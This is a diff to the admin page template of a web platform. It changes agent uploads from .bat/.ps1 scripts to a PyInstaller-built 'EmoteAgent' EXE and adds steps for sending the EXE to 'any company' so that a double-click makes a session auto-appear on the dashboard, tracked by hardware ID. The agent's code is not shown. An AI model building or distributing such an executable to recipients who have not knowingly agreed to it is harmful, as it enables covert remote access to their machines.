@@ -25,6 +25,7 @@
           </div>
         </div>
         <div class="admin-actions">
+          <a href="/dashboard" class="btn btn-outline btn-sm">Dashboard</a>
           <a href="/dev/logout" class="btn btn-outline btn-sm">Logout</a>
         </div>
       </div>
@@ -33,10 +34,6 @@
       <div class="section">
         <div class="section-title"><span class="dot green"></span> Platform Stats</div>
         <div class="agent-info">
-          <div class="agent-stat">
-            <div class="label">Users</div>
-            <div class="value"><%= stats.total_users %></div>
-          </div>
           <div class="agent-stat">
             <div class="label">Total Sessions</div>
             <div class="value"><%= stats.total_sessions %></div>
@@ -48,7 +45,7 @@
         </div>
       </div>
 
-      <!-- Current Agent -->
+      <!-- Current Agent EXE -->
       <div class="section">
         <div class="section-title">
           <% if (agent) { %>
@@ -56,7 +53,7 @@
           <% } else { %>
             <span class="dot red"></span>
           <% } %>
-          Current Agent File
+          Agent EXE
         </div>
 
         <% if (agent) { %>
@@ -75,28 +72,45 @@
             </div>
           </div>
           <div class="agent-actions">
-            <a href="/download/agent/binary" class="btn btn-outline btn-sm">Download</a>
+            <a href="/download/agent/binary" class="btn btn-primary btn-sm" style="font-size:14px;padding:10px 20px;">
+              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/>
+              </svg>
+              Download EXE
+            </a>
             <a href="/dev/delete-agent" class="btn btn-danger btn-sm" onclick="return confirm('Delete the current agent?')">Delete</a>
           </div>
         <% } else { %>
-          <div class="empty-state"><p>No agent uploaded yet</p></div>
+          <div class="empty-state"><p>No agent EXE uploaded yet. Build and upload one below.</p></div>
         <% } %>
       </div>
 
       <!-- Upload -->
       <div class="section">
-        <div class="section-title"><span class="dot"></span> Upload Agent File</div>
+        <div class="section-title"><span class="dot"></span> Upload Agent EXE</div>
         <form method="POST" action="/dev/upload" enctype="multipart/form-data" id="uploadForm">
           <div class="upload-area" id="uploadArea">
-            <input type="file" name="agent_file" id="fileInput" accept=".bat,.ps1,.zip" required>
+            <input type="file" name="agent_file" id="fileInput" accept=".exe" required>
             <div class="upload-icon">
               <svg viewBox="0 0 24 24"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>
             </div>
             <p class="upload-text" id="uploadText"><strong>Click to upload</strong> or drag & drop</p>
-            <p class="upload-hint">.bat or .ps1 — max 10 MB</p>
+            <p class="upload-hint">.exe — max 200 MB</p>
           </div>
-          <button type="submit" class="btn btn-primary" id="uploadBtn" style="margin-top:16px;display:none;background:#c44;">Upload Agent</button>
+          <button type="submit" class="btn btn-primary" id="uploadBtn" style="margin-top:16px;display:none;background:#c44;">Upload Agent EXE</button>
         </form>
+      </div>
+
+      <!-- Instructions -->
+      <div class="section">
+        <div class="section-title"><span class="dot"></span> How It Works</div>
+        <div style="color:var(--text-secondary);line-height:1.8;font-size:14px;">
+          <p>1. Build the agent: <code class="inline-code">pyinstaller --onefile --name EmoteAgent agent/agent.py</code></p>
+          <p>2. Upload the EXE above</p>
+          <p>3. Download and send it to any company — they just double-click it</p>
+          <p>4. A new session auto-appears on your dashboard</p>
+          <p>5. Same PC = same session (tracked by hardware ID)</p>
+        </div>
       </div>
     </div>
   </div>
